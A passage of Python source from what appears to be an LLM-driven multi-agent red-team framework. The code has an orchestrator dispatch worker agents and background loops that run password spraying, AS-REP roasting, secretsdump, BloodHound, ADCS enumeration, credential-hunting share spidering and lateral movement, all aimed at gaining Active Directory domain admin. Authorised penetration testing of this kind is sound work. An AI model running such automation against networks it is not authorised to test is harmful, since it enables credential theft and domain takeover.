        except Exception as e:
            logger.warning(f"Failed to generate report for {operation_id}: {e}")

        # Final summary log before return
        duration = (end_time - start_time).total_seconds()
        da_status = "✅ DA ACHIEVED" if final_state.has_domain_admin else "❌ No DA"
        logger.success(
            f"Operation {operation_id} finished: {da_status} | "
            f"{len(final_state.all_credentials)} creds | {len(final_state.all_hashes)} hashes | "
            f"{duration:.0f}s runtime"
        )

        return {
            "operation_id": operation_id,
            "success": final_state.has_domain_admin,
            "domain_admin_achieved": final_state.has_domain_admin,
            "domain_admin_path": final_state.domain_admin_path,
            "golden_ticket_forged": final_state.has_golden_ticket,
            "credentials_discovered": len(final_state.all_credentials),
            "hashes_discovered": len(final_state.all_hashes),
            "hosts_discovered": len(final_state.all_hosts),
            "vulnerabilities_discovered": exploitation_status.get(
                "total_discovered",
                len(final_state.discovered_vulnerabilities),
            ),
            "vulnerabilities_exploited": exploitation_status.get(
                "total_succeeded",
                len(final_state.exploited_vulnerabilities),
            ),
            "tasks_completed": len(final_state.completed_tasks),
            "start_time": start_time.isoformat(),
            "end_time": end_time.isoformat(),
            "duration_seconds": (end_time - start_time).total_seconds(),
            "report_path": str(report_path) if report_path else None,
            "report_markdown": report_markdown,
        }

    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise

    finally:
        from ares.core.replay import shutdown_replay

        shutdown_replay()

        # Cleanup - cancel all tasks and suppress CancelledError
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        # Release operation lock
        await task_queue.release_operation_lock(operation_id)
        await task_queue.disconnect()

        await dispatcher.stop()
        logger.info("Operation cleanup complete")


async def _create_orchestrator_agent(
    dispatcher: RedTeamDispatcher,
    model: str,
    max_steps: int,
    openai_api_key: str | None = None,
) -> Agent:
    """
    Create the orchestrator agent that coordinates the multi-agent operation.

    The orchestrator has:
    - Completion tools (complete_operation, announce_domain_admin) for stop conditions
    - OrchestratorTools for dispatching tasks to specialized worker agents
    - RedTeamReportingTools for recording findings and status

    The orchestrator does NOT execute exploitation tools directly. It delegates
    all tool execution to specialized worker agents (RECON, CREDENTIAL_ACCESS,
    CRACKER, ACL, PRIVESC, LATERAL, COERCION).

    Args:
        dispatcher: The dispatcher for inter-agent communication
        model: LLM model to use
        max_steps: Maximum agent steps
        openai_api_key: Optional OpenAI API key to bind directly to the generator

    Returns:
        Configured orchestrator agent
    """
    shared_state = dispatcher.shared_state
    # Ensure real-time publishing is enabled
    if not shared_state._dispatcher:
        shared_state.set_dispatcher(dispatcher)

    # Create orchestrator tools with dispatcher wired in
    # OrchestratorTools includes all orchestrator functionality:
    # - Stop conditions: complete_operation, announce_domain_admin
    # - Status: get_operation_summary, get_all_credentials, get_all_hashes, etc.
    # - Dispatch: dispatch_recon, dispatch_credential_access, etc.
    orchestrator_tools = OrchestratorTools()
    orchestrator_tools.set_dispatcher(dispatcher)
    orchestrator_tools.set_shared_state(shared_state)

    tools = [orchestrator_tools]

    # Load orchestrator-specific instructions
    instructions = load_agent_instructions(AgentRole.ORCHESTRATOR)

    # Create hooks for monitoring and guidance
    hooks = create_role_hooks(AgentRole.ORCHESTRATOR, dispatcher, shared_state)

    logger.info(f"Creating orchestrator agent with {len(tools)} toolsets, max_steps={max_steps}")

    resolved_model = _resolve_model_generator(model, openai_api_key)
    return dn.Agent(
        name="ares-orchestrator",
        model=resolved_model,
        instructions=instructions,
        max_steps=max_steps,
        tools=tools,  # type: ignore[arg-type]
        hooks=hooks,
        stop_conditions=[
            tool_use("complete_operation"),
            tool_use("announce_domain_admin"),
        ],
        thread=Thread(),  # type: ignore[call-arg]
    )


def _generate_multi_agent_report(
    state: SharedRedTeamState,
    *,
    report_dir: str | Path | None,
    exploitation_status: dict[str, Any] | None = None,
) -> tuple[Path, str]:
    resolved_report_dir = Path(report_dir or "./reports").resolve()
    resolved_report_dir.mkdir(parents=True, exist_ok=True)

    # Set vulnerability/exploitation counts from status if provided
    if exploitation_status:
        state.vulnerability_count = exploitation_status.get(
            "total_discovered",
            len(state.discovered_vulnerabilities),
        )
        state.exploited_count = exploitation_status.get(
            "total_succeeded",
            len(state.exploited_vulnerabilities),
        )

    report_generator = RedTeamReportGenerator()
    report_content = report_generator.generate(state)

    report_filename = f"{state.operation_id}_report.md"
    report_path = resolved_report_dir / report_filename
    report_path.write_text(report_content)
    logger.success(f"Red team report generated: {report_path}")
    return report_path, report_content


async def _create_agent_ensemble(
    dispatcher: RedTeamDispatcher,
    model: str,
    max_steps: int,
    namespace: str,
) -> dict[AgentRole, AgentInfo]:
    """
    Create the agent ensemble with role-specific configurations.

    Capabilities are loaded from config (single source of truth).

    Args:
        dispatcher: The dispatcher instance
        model: LLM model to use
        max_steps: Maximum agent steps
        namespace: Kubernetes namespace

    Returns:
        Dict mapping roles to agent info
    """
    agents: dict[AgentRole, AgentInfo] = {}

    # All roles to create
    roles_to_create = [
        AgentRole.RECON,
        AgentRole.CREDENTIAL_ACCESS,
        AgentRole.CRACKER,
        AgentRole.ACL,
        AgentRole.PRIVESC,
        AgentRole.LATERAL,
        AgentRole.COERCION,
    ]

    for role in roles_to_create:
        # Get capabilities from config (single source of truth)
        config_key = role.value  # e.g., "recon", "credential_access"
        agent_config = get_agent_config(config_key)
        capabilities = set(agent_config.capabilities)

        name = f"ares-{role.value.replace('_', '-')}"
        agent_info = AgentInfo(
            name=name,
            pod_name=f"{name}-0",  # Will be updated by K8s discovery
            role=role,
            capabilities=capabilities,
            status="idle",
        )
        agents[role] = agent_info

    return agents


async def _monitor_agent_health(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Background task to monitor agent health.

    Monitors agent heartbeats and alerts on:
    - Agents going offline
    - Agents reporting errors in heartbeat data
    - Agents persistently offline (3+ consecutive checks)

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between health checks
    """
    offline_counts: dict[str, int] = {}  # Track consecutive offline counts

    while True:
        try:
            agent_status = dispatcher.get_agent_status()

            offline_agents = [
                name for name, status in agent_status.items() if status["status"] == "offline"
            ]

            # Track consecutive offline counts
            for agent_name in agent_status:
                if agent_name in offline_agents:
                    offline_counts[agent_name] = offline_counts.get(agent_name, 0) + 1
                else:
                    offline_counts[agent_name] = 0

            # Alert on newly offline agents
            if offline_agents:
                for agent_name in offline_agents:
                    count = offline_counts.get(agent_name, 0)
                    if count == 1:
                        # First time offline - ERROR level
                        logger.error(f"Agent {agent_name} is now OFFLINE")
                    elif count == 3:
                        # Persistently offline - CRITICAL level
                        logger.critical(
                            f"Agent {agent_name} has been offline for {count} consecutive checks "
                            f"({count * check_interval:.0f}s). This may indicate a fatal error "
                            "such as authentication failure or misconfiguration."
                        )
                    elif count > 3 and count % 10 == 0:
                        # Remind every 10 checks if still offline
                        logger.critical(
                            f"Agent {agent_name} still offline after {count} checks "
                            f"({count * check_interval:.0f}s)"
                        )

            await asyncio.sleep(check_interval)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Health monitor error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _extend_operation_lock(
    task_queue: RedisTaskQueue,
    operation_id: str,
    interval: float = 600.0,
) -> None:
    """
    Periodically extend the operation lock to prevent expiry during long operations.

    Args:
        task_queue: The task queue with lock methods
        operation_id: Operation ID to extend lock for
        interval: Seconds between lock extensions (default: 10 minutes)
    """
    while True:
        await asyncio.sleep(interval)
        try:
            success = await task_queue.extend_operation_lock(operation_id)
            if not success:
                logger.warning(f"Failed to extend lock for operation {operation_id}")
        except Exception as e:
            logger.error(f"Error extending operation lock: {e}")


async def _auto_credential_expansion(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 10.0,  # Reduced from 30s for faster lateral testing
    min_hosts: int = 1,
) -> None:
    """
    Background task that automatically triggers credential expansion when new credentials appear.

    Monitors the shared state for new credentials and dispatches lateral movement
    tests without requiring the orchestrator LLM to explicitly call trigger_credential_expansion.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between credential checks
        min_hosts: Minimum hosts required before triggering expansion
    """
    from ares.core.workflows import credential_expansion_loop

    # NOTE: processed credentials persisted in state.processed_expansion_creds for restart recovery
    expansion_running = False

    def _make_expansion_key(username: str, domain: str, password: str) -> str:
        return f"{domain.lower()}:{username.lower()}:{hash(password or '')}"

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto credential expansion")
                break

            # Skip if not enough hosts discovered yet
            if len(state.all_hosts) < min_hosts:
                logger.debug(
                    f"Waiting for hosts ({len(state.all_hosts)}/{min_hosts}) before credential expansion"
                )
                continue

            # Check for new credentials (not yet in persisted state)
            new_creds = [
                c
                for c in state.all_credentials
                if _make_expansion_key(c.username, c.domain or "", c.password or "")
                not in state.processed_expansion_creds
            ]

            if new_creds and not expansion_running:
                logger.info(
                    f"Auto-expansion: {len(new_creds)} new credential(s) detected, "
                    f"triggering lateral movement tests against {len(state.all_hosts)} hosts"
                )

                expansion_running = True
                try:
                    await credential_expansion_loop(dispatcher, max_iterations=3)
                except Exception as e:
                    logger.warning(f"Credential expansion failed: {e}")
                finally:
                    expansion_running = False
                    # Mark all current creds as processed (persist to state)
                    for c in state.all_credentials:
                        key = _make_expansion_key(c.username, c.domain or "", c.password or "")
                        state.processed_expansion_creds.add(key)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto credential expansion error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_mssql_detection(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
) -> None:
    """
    Background task that periodically scans for MSSQL hosts and queues vulnerabilities.

    This catches MSSQL hosts discovered by worker agents that don't go through
    the orchestrator's publish_host() method.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between MSSQL scans
    """
    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping MSSQL detection")
                break

            # Skip if no hosts discovered yet
            if not state.all_hosts:
                logger.debug("MSSQL scanner: no hosts discovered yet")
                continue

            # Always scan all hosts - dispatcher handles deduplication via already_queued check
            # This ensures we catch hosts whose services were updated after initial discovery
            queued = await dispatcher.scan_hosts_for_mssql()

            if queued > 0:
                logger.info(
                    f"🗄️ Auto-detected MSSQL: queued {queued} vulnerability(ies) for exploitation"
                )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"MSSQL detection error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_adcs_enumeration(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 45.0,
    max_retries: int = 2,
) -> None:
    """
    Background task that automatically runs ADCS enumeration when:
    1. ADCS servers are detected (CertEnroll share indicator)
    2. Credentials are available for authentication

    This catches ADCS servers discovered by worker agents and triggers
    certipy_find to enumerate ESC1-ESC15 vulnerabilities.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between ADCS checks
        max_retries: Maximum retry attempts per server (reduced to avoid blocking privesc queue)
    """
    # Track (server, user, domain) -> (task_id, attempt_count, last_attempt_time)
    adcs_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
    # NOTE: successful_servers persisted in state.processed_adcs_servers for restart recovery
    failed_servers: set[str] = set()  # Servers that consistently fail - transient
    retry_cooldown = 60.0  # Wait 1 minute before retrying failed tasks
    stuck_task_timeout = 480.0  # Consider tasks stuck after 8 minutes

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping ADCS enumeration")
                break

            # Need credentials to enumerate ADCS
            if not state.all_credentials:
                logger.debug("ADCS scanner: waiting for credentials")
                continue

            # Find ADCS servers (hosts with CertEnroll share)
            adcs_servers = dispatcher.find_adcs_servers()

            if not adcs_servers:
                logger.debug("ADCS scanner: no ADCS servers detected yet")
                continue

            # Build current domain set (computed from state each iteration)
            _iter_domains: set[str] = set()
            if state.target and state.target.domain:
                _iter_domains.add(state.target.domain)
            for cred in state.all_credentials:
                if cred.domain:
                    _iter_domains.add(cred.domain)

            current_time = asyncio.get_event_loop().time()

            # Try to enumerate each ADCS server with available credentials
            for server_ip, server_hostname in adcs_servers:
                # Skip servers we've already successfully enumerated (persisted in state)
                if server_ip in state.processed_adcs_servers:
                    continue

                # Skip servers that have consistently failed (stop wasting privesc queue time)
                if server_ip in failed_servers:
                    continue

                # Count total failures for this server across all credentials
                server_failure_count = sum(
                    1 for k, v in adcs_attempts.items() if k[0] == server_ip and v[1] >= max_retries
                )
                if server_failure_count >= 2:
                    logger.warning(
                        f"⏭️ Auto-ADCS: Skipping {server_ip} - failed with multiple credentials"
                    )
                    failed_servers.add(server_ip)
                    continue

                for cred in state.all_credentials:
                    if not cred.password:
                        continue

                    cred_key = (server_ip, cred.username, cred.domain or "")

                    # Check if we've already attempted with this credential
                    if cred_key in adcs_attempts:
                        task_id, attempt_count, last_attempt = adcs_attempts[cred_key]

                        # Check if the task completed successfully
                        task_info = state.pending_tasks.get(task_id)
                        if task_info and task_info.status == TaskStatus.COMPLETED:
                            state.processed_adcs_servers.add(server_ip)
                            logger.info(f"ADCS enumeration succeeded for {server_ip}")
                            break

                        # Skip if max retries reached
                        if attempt_count >= max_retries:
                            continue

                        # Skip if still in cooldown
                        if current_time - last_attempt < retry_cooldown:
                            continue

                        # Check for stuck tasks (running > 8 minutes without completion)
                        if task_id in state.pending_tasks:
                            elapsed = current_time - last_attempt
                            if elapsed > stuck_task_timeout:
                                logger.warning(
                                    f"⏰ Auto-ADCS: Task {task_id} stuck for {elapsed:.0f}s, "
                                    f"marking {server_ip} as failed"
                                )
                                # Increment failure count to skip retries
                                adcs_attempts[cred_key] = (task_id, max_retries, last_attempt)
                                continue
                            # Task still in progress and not stuck yet
                            continue

                        # Task not in pending_tasks means it completed/failed
                        logger.info(
                            f"🔄 Auto-ADCS: Retrying {server_ip} with {cred.domain}\\{cred.username} "
                            f"(attempt {attempt_count + 1}/{max_retries})"
                        )
                    else:
                        attempt_count = 0

                    # Find the best domain for this enumeration
                    target_domain = cred.domain
                    if not target_domain:
                        target_domain = state.target.domain if state.target else ""
                    if not target_domain and _iter_domains:
                        target_domain = next(iter(_iter_domains))

                    if not target_domain:
                        continue

                    logger.info(
                        f"🔐 Auto-ADCS: Found ADCS server {server_ip} ({server_hostname}), "
                        f"dispatching certipy_find with {cred.domain}\\{cred.username}"
                    )

                    task_id = await dispatcher.request_adcs_enumeration(
                        source_agent="orchestrator",
                        target_ip=server_ip,
                        domain=target_domain,
                        username=cred.username,
                        password=cred.password,
                    )

                    # Always record attempt to prevent retry storm when throttled
                    # The deferred queue handles actual retries for deferred tasks
                    adcs_attempts[cred_key] = (task_id or "", attempt_count + 1, current_time)
                    if task_id:
                        logger.info(f"ADCS enumeration task {task_id} dispatched for {server_ip}")
                    # Only dispatch one task per server per cycle
                    break

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"ADCS enumeration error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_share_spider(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Background task that automatically spiders discovered shares for credentials.

    When shares with READ access are discovered and we have valid credentials,
    dispatch share_spider tasks to search for sensitive files like:
    - Configuration files with passwords
    - Scripts with hardcoded credentials
    - Text files with credential information

    This catches common scenarios like credentials stored in share files.
    """
    # NOTE: spidered shares persisted in state.processed_spidered_shares ("host:share:user:domain")

    while True:
        try:
            state = dispatcher.shared_state

            # Only stop when operation is explicitly completed, NOT when DA is achieved
            # We still want to spider shares after DA to find additional credentials and loot
            if state.completed:
                logger.debug("Operation complete, stopping auto share spider")
                break

            # Need credentials to spider shares (authenticated access)
            if not state.all_credentials:
                await asyncio.sleep(check_interval)
                continue

            # Find shares with READ access (excluding admin shares)
            readable_shares = [
                share
                for share in state.all_shares
                if share.permissions
                and "READ" in share.permissions.upper()
                and share.name.lower() not in ("ipc$", "print$")
                # Skip admin shares - focus on custom shares like "all", "public"
                and share.name.lower() not in ("admin$", "c$", "d$", "e$")
            ]

            if not readable_shares:
                await asyncio.sleep(check_interval)
                continue

            # For each readable share, try to spider with available credentials
            for share in readable_shares:
                for cred in state.all_credentials:
                    if not cred.password:
                        continue  # Need password for SMB auth

                    # Create unique key for this spider attempt (persisted in state)
                    spider_key = (
                        f"{share.host.lower()}:{share.name.lower()}:"
                        f"{cred.username.lower()}:{(cred.domain or '').lower()}"
                    )

                    if spider_key in state.processed_spidered_shares:
                        continue

                    # Dispatch share spider task
                    domain = cred.domain or (state.target.domain if state.target else "")
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=[share.host],
                        username=cred.username,
                        password=cred.password,
                        reason=f"auto_share_spider_{share.name}",
                        techniques=["smbclient_spider"],
                    )

                    # Always mark as processed to prevent retry storm when throttled
                    state.processed_spidered_shares.add(spider_key)
                    if task_id:
                        logger.info(
                            f"🕷️ Auto share spider dispatched: {cred.domain or '(local)'}\\{cred.username} -> {share.host}/{share.name} (task {task_id})"
                        )
                    # Only spider each share once per credential - don't flood
                    break

            await asyncio.sleep(check_interval)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto share spider error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_bloodhound(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
    max_retries: int = 3,
) -> None:
    """
    Background task that automatically runs BloodHound when credentials are discovered.

    BloodHound collection is critical for finding attack paths to Domain Admin.
    This ensures it runs early once we have valid credentials, without relying
    on the orchestrator to remember to dispatch it.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for new credentials
        max_retries: Maximum retry attempts per domain
    """
    # Track (domain, username) -> (task_id, attempt_count, last_attempt_time)
    bloodhound_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
    # NOTE: successful domains persisted in state.processed_bloodhound_domains for restart recovery
    retry_cooldown = 120.0  # Wait 2 minutes before retrying failed tasks

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping BloodHound automation")
                break

            # Need credentials to run BloodHound
            if not state.all_credentials:
                logger.debug("BloodHound scanner: waiting for credentials")
                continue

            # Build current domain set (computed from state each iteration)
            _iter_domains: set[str] = set()
            if state.target and state.target.domain:
                _iter_domains.add(state.target.domain.lower())
            for cred in state.all_credentials:
                if cred.domain:
                    _iter_domains.add(cred.domain.lower())
            # Include trusted domains discovered via BloodHound/nltest
            for trusted in state.trusted_domains:
                if trusted:
                    _iter_domains.add(trusted.lower())
            # Also include domains from discovered hosts (parent/sibling domains)
            for host in state.all_hosts:
                if host.hostname and "." in host.hostname:
                    # Extract domain from FQDN (e.g., dc.parent.local -> parent.local)
                    parts = host.hostname.lower().split(".", 1)
                    if len(parts) > 1:
                        host_domain = parts[1]
                        if host_domain and not host_domain.endswith(".internal"):
                            _iter_domains.add(host_domain)

            if not _iter_domains:
                continue

            current_time = asyncio.get_event_loop().time()

            # Try to run BloodHound for each domain
            for domain in _iter_domains:
                # Skip domains we've already successfully enumerated (persisted in state)
                if domain.lower() in state.processed_bloodhound_domains:
                    continue

                # Find a credential for this domain
                # First try same-domain creds, then cross-domain creds (trusts allow this)
                sorted_creds = sorted(
                    [c for c in state.all_credentials if c.password],
                    key=lambda c: (
                        0 if (c.domain or "").lower() == domain.lower() else 1,
                        0 if c.is_admin else 1,
                    ),
                )
                for cred in sorted_creds:
                    cred_domain = (cred.domain or "").lower()
                    # Allow cross-domain enumeration via trusts
                    # (same-domain creds are sorted first above)

                    cred_key = (domain.lower(), cred.username.lower(), cred_domain)

                    # Check if we've already attempted with this credential
                    if cred_key in bloodhound_attempts:
                        task_id, attempt_count, last_attempt = bloodhound_attempts[cred_key]

                        # Check if the task completed successfully
                        task_info = state.pending_tasks.get(task_id)
                        if task_info and task_info.status == TaskStatus.COMPLETED:
                            state.processed_bloodhound_domains.add(domain.lower())
                            logger.info(f"BloodHound collection succeeded for {domain}")
                            break

                        # Skip if max retries reached
                        if attempt_count >= max_retries:
                            continue

                        # Skip if still in cooldown
                        if current_time - last_attempt < retry_cooldown:
                            continue

                        # Check if task failed (not in pending_tasks means it completed/failed)
                        if task_id not in state.pending_tasks:
                            logger.info(
                                f"🔄 Auto-BloodHound: Retrying {domain} with {cred.domain}\\{cred.username} "
                                f"(attempt {attempt_count + 1}/{max_retries})"
                            )
                        else:
                            # Task still in progress
                            continue
                    else:
                        attempt_count = 0

                    logger.info(
                        f"🩸 Auto-BloodHound: Dispatching collection for {domain} with {cred.domain}\\{cred.username}"
                    )

                    task_id = await dispatcher.request_recon(
                        source_agent="orchestrator",
                        domain=domain,
                        username=cred.username,
                        password=cred.password,
                        reason="bloodhound",
                        techniques=["run_bloodhound"],
                    )

                    # Always record attempt to prevent retry storm when throttled
                    # The deferred queue handles actual retries for deferred tasks
                    bloodhound_attempts[cred_key] = (task_id or "", attempt_count + 1, current_time)
                    if task_id:
                        logger.info(f"BloodHound task {task_id} dispatched for {domain}")
                    # Only dispatch one task per domain per cycle
                    break

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"BloodHound automation error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


def _make_cred_key(username: str, domain: str, password: str) -> str:
    """Generate consistent key for credential expansion tracking.

    Uses hashlib.md5 instead of Python's hash() because hash() returns
    different values across Python sessions (randomized since Python 3.3).
    This caused duplicate dispatches after orchestrator restarts.
    """
    pw_hash = hashlib.md5(password.encode(), usedforsecurity=False).hexdigest()[:8]
    return f"{domain.lower()}:{username.lower()}:{pw_hash}"


def _make_hash_key(username: str, domain: str, hash_value: str) -> str:
    """Generate consistent key for hash lateral movement tracking."""
    return f"{domain.lower()}:{username.lower()}:{hash_value[:32]}"


def _make_crack_key(username: str, domain: str, hash_value: str, hash_type: str) -> str:
    """Generate consistent key for crack request tracking."""
    return f"{domain.lower()}:{username.lower()}:{hash_value[:32]}:{hash_type.upper()}"


def _get_dc_ips(state: SharedRedTeamState) -> set[str]:
    """Get set of IPs that are known Domain Controllers."""
    dc_ips: set[str] = set()
    for host in state.all_hosts:
        if not host.ip:
            continue
        roles_str = str(host.roles).lower()
        if any(marker in roles_str for marker in ("dc", "domain controller", "ad dc")):
            dc_ips.add(host.ip)
    return dc_ips


def _has_constrained_delegation_for_target(state: SharedRedTeamState, target_ip: str) -> bool:
    """Check if there's a constrained delegation vulnerability targeting this host.

    If true, we should use the S4U attack path instead of direct secretsdump.
    """
    for vuln in state.discovered_vulnerabilities.values():
        if vuln.vuln_type != "constrained_delegation":
            continue
        # Defensive: ensure vuln.details is a dict before calling .get()
        details = vuln.details if isinstance(vuln.details, dict) else {}
        # Check if target matches the vulnerability's target
        vuln_target_ip = details.get("target_ip", "")
        if vuln_target_ip == target_ip:
            return True
        # Also check hostname in target_spn
        target_spn = details.get("target_spn", "")
        if target_spn:
            # Extract hostname from SPN (e.g., cifs/dc01.contoso.local -> dc01.contoso.local)
            spn_host = target_spn.split("/", 1)[1] if "/" in target_spn else ""
            for host in state.all_hosts:
                if (
                    host.ip == target_ip
                    and host.hostname
                    and spn_host.lower() in host.hostname.lower()
                ):
                    return True
    return False


def _is_likely_privileged_credential(username: str, source: str | None) -> bool:
    """Check if credential is likely to have DA/DCSync rights.

    Returns True for:
    - Administrator account
    - Credentials obtained from secretsdump on a DC (likely DA)
    - Credentials with 'admin' in the name
    """
    username_lower = username.lower()
    if username_lower in ("administrator", "admin", "krbtgt"):
        return True
    if "admin" in username_lower:
        return True
    # Credentials from secretsdump are likely privileged if they came from a DC
    return bool(source and "secretsdump" in source.lower())


async def _auto_credential_access(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 15.0,  # Reduced from 60s for faster reaction
    min_hosts: int = 1,
) -> None:
    """
    Background task that proactively runs credential access techniques.

    1) If no creds/hashes yet, run no-creds AS-REP roast per domain.
    2) For each new credential/hash, run kerberoast + secretsdump attempts.
    3) When new users are discovered without credentials, run username_as_password.

    All tracking is persisted to state for recovery after restart.
    """
    # NOTE: All tracking now uses state fields instead of local variables
    # This enables recovery after orchestrator restart without duplicate work
    last_user_count: dict[str, int] = {}  # Only this stays local (non-critical)

    while True:
        try:
            state = dispatcher.shared_state

            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto credential access")
                break

            if len(state.all_hosts) < min_hosts and not state.target:
                logger.debug(
                    f"Waiting for hosts ({len(state.all_hosts)}/{min_hosts}) "
                    "before credential access"
                )
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            host_ips = [h.ip for h in state.all_hosts if h.ip]
            if not host_ips and state.target and state.target.ip:
                host_ips = [state.target.ip]

            _iter_hosts_by_domain: dict[str, list[str]] = {}
            for host in state.all_hosts:
                if not host.ip:
                    continue
                hostname = (host.hostname or "").lower()
                if "." in hostname:
                    host_domain = hostname.split(".", 1)[1]
                    _iter_hosts_by_domain.setdefault(host_domain, []).append(host.ip)
            if state.target and state.target.domain and state.target.ip:
                _iter_hosts_by_domain.setdefault(state.target.domain.lower(), []).append(
                    state.target.ip
                )

            # Build current domain set (computed from state each iteration)
            _iter_domains: set[str] = set()
            if state.target and state.target.domain:
                _iter_domains.add(state.target.domain)
            for cred in state.all_credentials:
                if cred.domain:
                    _iter_domains.add(cred.domain)
            for user in state.all_users:
                if user.domain:
                    _iter_domains.add(user.domain)

            if not _iter_domains:
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            has_new_creds = any(
                _make_cred_key(cred.username, cred.domain or "", cred.password or "")
                not in state.processed_cred_expansion
                for cred in state.all_credentials
            )
            has_new_hashes = any(
                _make_hash_key(hash_obj.username, hash_obj.domain or "", hash_obj.hash_value)
                not in state.processed_hash_lateral
                for hash_obj in state.all_hashes
            )
            has_new_cracks = any(
                _make_crack_key(
                    hash_obj.username,
                    hash_obj.domain or "",
                    hash_obj.hash_value,
                    hash_obj.hash_type or "",
                )
                not in state.processed_crack_requests
                and not hash_obj.cracked_password
                for hash_obj in state.all_hashes
            )
            has_new_domains = (
                not state.all_credentials
                and not state.all_hashes
                and any(d.lower() not in state.processed_asrep_domains for d in _iter_domains)
            )
            # Check if any domain has users but hasn't had password spray run yet
            has_unsprayed_users = any(
                d.lower() not in state.processed_password_spray
                and sum(1 for u in state.all_users if (u.domain or "").lower() == d.lower()) >= 3
                for d in _iter_domains
            )

            if not (
                has_new_creds
                or has_new_hashes
                or has_new_cracks
                or has_new_domains
                or has_unsprayed_users
            ):
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            if not state.all_credentials and not state.all_hashes:
                for domain in sorted(_iter_domains):
                    if domain.lower() in state.processed_asrep_domains:
                        continue
                    domain_hosts = _iter_hosts_by_domain.get(domain.lower(), []) or host_ips
                    # These techniques work without credentials:
                    # - asrep_roast: queries DC for accounts without pre-auth
                    # - username_as_password: auto-enumerates users via null session, then tests user=pass
                    # - password_spray: auto-enumerates users, sprays common passwords
                    fruit_task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=domain_hosts,
                        reason="low_hanging_fruit_no_creds",
                        techniques=[
                            "username_as_password",  # Auto-enumerates users, tests user:user
                            "password_spray",  # Auto-enumerates users, sprays common passwords
                            "asrep_roast",  # Users without pre-auth
                        ],
                    )
                    # Always mark as processed to prevent retry storm when throttled
                    # The deferred queue handles actual retries for deferred tasks
                    state.processed_asrep_domains.add(domain.lower())
                    if fruit_task_id:
                        logger.info(
                            f"Auto credential access (low-hanging fruit, no-creds) dispatched for domain {domain}"
                        )

            # Check for new users without credentials - run username_as_password on them
            # This catches cases like testuser:testuser where username equals password
            for domain in sorted(_iter_domains):
                # Find users in this domain that don't have credentials
                domain_users = [
                    u.username
                    for u in state.all_users
                    if (u.domain or "").lower() == domain.lower()
                ]
                users_with_creds = {
                    c.username.lower()
                    for c in state.all_credentials
                    if (c.domain or "").lower() == domain.lower()
                }
                users_without_creds = [u for u in domain_users if u.lower() not in users_with_creds]

                # Find an existing credential for this domain to use for user enumeration
                enum_cred = None
                for c in state.all_credentials:
                    if (c.domain or "").lower() == domain.lower() and c.password:
                        enum_cred = c
                        break

                domain_hosts = _iter_hosts_by_domain.get(domain.lower(), []) or host_ips

                # Run username_as_password if we have enough users and haven't done it yet
                should_run_username_spray = domain.lower() not in state.processed_username_spray
                if domain.lower() in state.processed_username_spray:
                    # Re-run if we've discovered significantly more users
                    current_count = len(domain_users)
                    prev_count = last_user_count.get(domain.lower(), 0)
                    should_run_username_spray = current_count > prev_count + 5

                if should_run_username_spray and len(users_without_creds) >= 3:
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=domain_hosts,
                        username=enum_cred.username if enum_cred else "",
                        password=enum_cred.password if enum_cred else None,
                        reason="low_hanging_fruit_new_users",
                        techniques=["username_as_password"],
                    )
                    # Always mark as processed to prevent retry storm when throttled
                    state.processed_username_spray.add(domain.lower())
                    last_user_count[domain.lower()] = len(domain_users)
                    if task_id:
                        cred_info = (
                            f"{enum_cred.domain}\\{enum_cred.username}"
                            if enum_cred
                            else "null session"
                        )
                        logger.info(
                            f"Auto username_as_password dispatched for {len(users_without_creds)} users without creds in {domain} (using {cred_info} for enum)"
                        )

                # Run password_spray with common passwords if we have users and haven't done it
                # This is separate from username_as_password - we spray common passwords
                if domain.lower() not in state.processed_password_spray and len(domain_users) >= 3:
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
